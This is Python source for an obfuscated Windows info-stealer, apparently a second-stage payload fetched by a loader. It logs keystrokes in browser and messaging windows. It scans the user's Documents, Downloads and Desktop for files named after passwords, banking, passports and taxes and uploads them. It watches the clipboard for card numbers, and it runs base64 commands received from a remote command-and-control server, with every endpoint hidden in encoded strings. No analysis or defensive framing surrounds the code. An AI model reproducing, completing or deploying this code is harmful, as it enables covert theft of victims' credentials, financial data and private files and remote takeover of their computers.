# from cryptography.fernet import Fernet
# from sqlite3 import connect
# from shutil import copy
# from win32crypt import CryptUnprotectData
# import os
# import datetime 
# import base64
# import requests
# import threading
# import pynput
# import pygetwindow
# import subprocess
# import pyperclip
# import random
# import time
# import re

# The below code will be encrypted and than stored on the server, it will be fetched and executed by first stage

try:
    keyboard = getattr(__import__('pynput'), 'keyboard')
    Thread =  __import__('threading').Thread
    k_list = []
    bot_id = ''
    if os.path.exists(os.path.join(os.path.expanduser('~'), "^#@oa!a".replace("^", "A").replace("#", "p").replace("@", "p").replace("!", "t").replace("o", "D"), "belal".replace("bel", "Loc"), "$o!.txt".replace("$", "b").replace("!", "t"))):
            with open(os.path.join(os.path.expanduser('~'), "^#@oa!a".replace("^", "A").replace("#", "p").replace("@", "p").replace("!", "t").replace("o", "D"), "belal".replace("bel", "Loc"), "$o!.txt".replace("$", "b").replace("!", "t")), 'r') as o:
                bot_id = o.read()
    else:
        with open(os.path.join(os.path.expanduser("~"), "^#@oa!a".replace("^", "A").replace("#", "p").replace("@", "p").replace("!", "t").replace("o", "D"), "belal".replace("bel", "Loc"), "$o!.txt".replace("$", "b").replace("!", "t")), 'w') as q:
                bot_id = f'{random.randint(10000, 90000)}{chr(random.randint(65,90))}{chr(random.randint(97,122))}'
                q.write(bot_id)
        subprocess.run(f'attrib +h "{os.path.join(os.path.expanduser("~"), "^#@oa!a".replace("^", "A").replace("#", "p").replace("@", "p").replace("!", "t").replace("o", "D"), "belal".replace("bel", "Loc"), "$o!.txt".replace("$", "b").replace("!", "t"))}"', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
    file_name = datetime.datetime.now().strftime("%Y-%m-%d - %I-%M-%S %p")
    f_path = os.path.join(os.path.expanduser('~'), f'{chr(65) + chr(112) + chr(112) + chr(68) + chr(97) + chr(116) + chr(97)}', f'{chr(76) + chr(111) + chr(99) + chr(97) + chr(108)}', f'{file_name}.txt')
    curr_win = ''
    
    def exfilteration_routine():
        global bot_id
        dir_path = os.path.join(os.path.expanduser("~"), f'{chr(10*6+5)+chr(112)+chr(112)+chr(68)+chr(97)+chr(116)+chr(97)}', "holafti".replace('holafti', 'Local'))
        c = 1
        while True:
            for f_path in os.listdir(dir_path):
                if f_path.startswith("2024"):
                    retry = True
                    while retry:
                        try:
                            if os.path.getsize(os.path.join(dir_path, f_path)) < 1:
                                os.remove(os.path.join(dir_path, f_path))
                                retry = False
                                time.sleep(0.6)
                            else:
                                with open(os.path.join(dir_path, f_path), "rb+") as j:
                                    read_data = j.read()
                                    encoded_dat = base64.b64encode(read_data).decode()
                                    requests.post(base64.b64decode('Cmh0dHBzOi8vY3MudHJ1LmNhL35vc19qbWlzdHJ5L2ZpbGVfc3lzdGVtL3VwbG9hZC5waHAK').decode('utf-8').strip(), data=encoded_dat, headers={"Content-Type": "application/octet-stream", "X-FILENAME": f'{bot_id}_{f_path}'})
                                    j.seek(0)
                                    j.truncate()
                                retry = False
                        except IOError as e:
                                time.sleep(2.5)
                else:
                    pass
            if c == 1:
                time.sleep(random.randint(60,180))
            else:
                time.sleep(random.randint(300, 600))
            c += 1
            
    def file_stealer():
        global bot_id
        pafamdi = compile(base64.b64decode('CndpdGggb3BlbihsLCAnc#InKSBhcyBnOgogICAgICAgIGFfZGF0ID0gZy5yZWFkKCkKICAgICAgICByX2RhdCA9IG^hc2U2NC5iNjRlb#NvZGUo!*9k!XQpL#Rl!29kZSgndXR#LTgnKQpyZXNwID0gc#*xdW*zdHMucG9zdChi!XNlNjQu!j!0ZG*jb2RlKC^DbWgwZEhCek9pOHZZM011ZEhKMUxtT#hMMz*2!zE5cW^XbHpkSEo1TD^acG^H*#ZjM2x6ZEdWdEwz*ndiRzloWkM1d2FIQUsiKS5kZWNvZGUoKS5zdH^pcCgpLCBk!XRhPX^fZGF0LCBoZWFkZX^zPXsiQ29udG*udC1UeXBlIjogI#FwcGxp!2F0aW9uL29jdG*0LXN0c#*hbSIsIC^!LUZ^TE*OQU1FIjogZid7!#90X2lkf*97b3MucGF0aC5i!XNlb#FtZShsKX0nfSkKaW!gc#*zcC5zdGF0dXNf!29kZSA9PSAyMDA6CiAgICAgICAgd2l0aCBvcG*uKG9zLnBhdGgua#9pbihvcy5w!XRoL#*4cGFuZH*zZXIo^34nKSwg^0FwcERhdGEnLCAnTG9j!WwnLCAnZXh#aWwudHh0^yksICdh^ykg!XMgZDoKICAgICAgICAgICAgICAgIGQud3^pdGUoZid7bH1cbicpCiAgICAgICAgdGltZS5zbG*lcChy!W5kb20uc#FuZGludCgzMDAsID!wMCkpC#*sc2U6CiAgICBw!XNzCg=='.replace('#', 'm').replace('*', 'V').replace('!', 'Y').replace('^', 'J')).decode('utf-8'),'<string>', 'exec')
        directories = [
         os.path.join(os.path.expanduser('~'), 'Documents'),
         os.path.join(os.path.expanduser('~'), 'Downloads'),
         os.path.join(os.path.expanduser('~'), 'Desktop'),
        ]
        keywords = [
        'midterm', 'finals', 'final' 'password', 'passwords' 'bank', 'payroll',
        'resume', 'job', 'offer', 'letter', 'record', 'records', 'cover', 'T00', 'reference','passport', 'social', 'credit', 'account',
        'invoice', 'tax', 'statement', 'payment', 'transaction', 'cv', 'SIN', 'credentials', 'receipt', 'banking'
        ]
        e_list = ['bin', 'include', 'app', 'src', 'node_modules', 'venv', 'dist', 'site-packages', 'lib']
        f_list = []
        if not os.path.exists(os.path.join(os.path.expanduser('~'), f'{chr(65)+chr(112)+chr(112)+chr(68)+chr(97)+chr(116)+chr(97)}', f'{chr(76)+chr(111)+chr(99)+chr(97)+chr(108)}', f'{chr(101)+chr(120)+chr(102)+chr(105)+chr(108)}.txt')):
            with open(os.path.join(os.path.expanduser('~'), f'{chr(65)+chr(112)+chr(112)+chr(68)+chr(97)+chr(116)+chr(97)}', f'{chr(76)+chr(111)+chr(99)+chr(97)+chr(108)}', f'{chr(101)+chr(120)+chr(102)+chr(105)+chr(108)}.txt'), 'w') as o:
                    o.write('')
            os.system(f"attrib +h {os.path.join(os.path.expanduser('~'), f'{chr(65)+chr(112)+chr(112)+chr(68)+chr(97)+chr(116)+chr(97)}', f'{chr(76)+chr(111)+chr(99)+chr(97)+chr(108)}', f'{chr(101)+chr(120)+chr(102)+chr(105)+chr(108)}.txt')}")
        with open(os.path.join(os.path.expanduser('~'), 'AppData', 'Local', 'exfil.txt'), 'r') as o:
                path_set = set(o.read().splitlines())
        for directory in directories:
            if os.path.exists(directory):
                    for root, dirs, files in os.walk(directory):
                        dirs[:] = [d for d in dirs if not any(part in e_list for part in os.path.join(root, d).split(os.path.sep))]
                        for filename in files:
                            if os.path.join(root,filename) in path_set:
                                pass
                            else:
                                if any(keyword.lower() in filename.lower() for keyword in keywords):
                                    f_list.append(os.path.join(root, filename))
            else:
                time.sleep(0.2)
        time.sleep(random.randint(4,12))
        if len(f_list) > 0:
            for l in f_list:
                exec(pafamdi)
        return
        
    def c2_command_thread():
        global bot_id
        while True:
            time.sleep(random.randint(5,13))
            rec_data = requests.get(base64.b64decode('Cmh0dHBzOi8vY3MudHJ1LmNhL35vc19qbWlzdHJ5L2ZpbGVfc3lzdGVtL2NvbW1hbmQucGhwCg==').decode('utf-8').strip())
            if rec_data.status_code == 200:
                payload = rec_data.text.replace("<h1>", "").replace("</h1>", "")
                if payload == 'Nothing':
                        time.sleep(random.randint(240, 480))
                else:
                    try:
                        c_list = payload.split("*")
                        payload = ''
                        bot = c_list[0]
                        command = c_list[1]
                        if bot == bot_id or bot == 'jinn':
                            try:
                                exec(base64.b64decode(command.strip().replace('#', 'm').replace('?', 'V').replace('!', 'Y').replace('^', 'J')).decode('utf-8'))
                                dec_pay = ''
                            except Exception as e:
                                dec_pay = ''
                                requests.post(base64.b64decode('Cmh0dHBzOi8vY3MudHJ1LmNhL35vc19qbWlzdHJ5L2ZpbGVfc3lzdGVtL3BhbmVsLnBocAo=').decode('utf-8').strip(), data={"mal_dat": base64.b64encode(f'Error: {e}'.encode()).decode()}, headers = {"Content-Type": "application/x-www-form-urlencoded"})
                            time.sleep(random.randint(240, 480))
                    except Exception as qq:
                        time.sleep(random.randint(240, 480))
            else:
                time.sleep(random.randint(240, 480))
                
    def clip_board_monitor():
        global bot_id
        last_clipboard_content = ""
        curr_time = datetime.datetime.now().strftime("%Y-%m-%d - %I-%M %p")
        clip_path = os.path.join(os.path.expanduser("~"), "AppData", "Local", f'{curr_time}_clip_{bot_id}.txt')
        curr_clip_win = ''
        check_wins = ['Banking', 'bank', 'Payment', 'Inbox', 'gmail', 'outlook', 'lastpass', 'chrome', 'edge', 'whatsapp', 'firefox', 'discord']
        re_checks = [
        r'[a-zA-Z0-9._%+-]+@gmail\\.com',
        r'\\b(\\d{4}[-\\s]?){3}\\d{4}\\b',
        r'\\b\\d{3,4}\\b'
        ]
        while True:
            try:
                try:
                    n_clip_win = pygetwindow.getActiveWindowTitle()
                except:
                    n_clip_win = ''
                current_clipboard_content = pyperclip.paste()
                if any(word.lower() in n_clip_win.lower() for word in check_wins):
                    if current_clipboard_content != last_clipboard_content:
                        for pat in re_checks:
                            if re.search(pat, current_clipboard_content):
                                last_clipboard_content = current_clipboard_content
                                with open(clip_path, 'a', encoding='utf-8') as e:
                                    if curr_clip_win != n_clip_win:
                                        curr_clip_win = n_clip_win
                                        e.write(f'{n_clip_win}\\n{current_clipboard_content}\\n')
                                    else:
                                        e.write(f'{current_clipboard_content}\\n')
                time.sleep(random.randint(1,3))
            except Exception as e:
                pass
                
    def key_log_thread(key):
        global f_path
        global curr_win
        global k_list
        new_win = ''
        if len(k_list) > 20:
            with open(f_path, "a", encoding='utf-8') as log_file:
                log_file.write(''.join(k_list))
            k_list.clear()
        try:
            try:
                new_win = pygetwindow.getActiveWindowTitle()
            except:
                new_win = ''
            if new_win:
                if curr_win != new_win:
                    curr_win = new_win
                    if any(browser in curr_win.lower() for browser in ['chrome', 'edge', 'firefox', 'incognito', 'browser', 'email', 'whatsapp']):
                        k_list.append(f'Active: {curr_win}\\n')
                if any(browser in curr_win.lower() for browser in ['chrome', 'edge', 'firefox', 'incognito', 'browser', 'email', 'whatsapp']):
                    try:
                        k_list.append(f'{key.char}\\n')
                    except AttributeError:
                        k_list.append(f'{key}\\n')
        except Exception as e:
            pass
    listener = keyboard.Listener(on_press=key_log_thread)
    listener.start()
    try:
        s_routine = Thread(target=redscfg)
        s_routine.start()
    except Exception as e:
        pass
    try:
        s_t = Thread(target=file_stealer)
        s_t.start()
    except Exception as q:
        print(q)
        pass
    try:
        s_gfd = Thread(target=c2_command_thread)
        s_gfd.start()
    except Exception as l:
        pass
    try:
        clipboard_thread = Thread(target= clip_board_monitor)
        clipboard_thread.start()
    except Exception as e:
        pass
    listener.join()
except Exception as k:
    pass



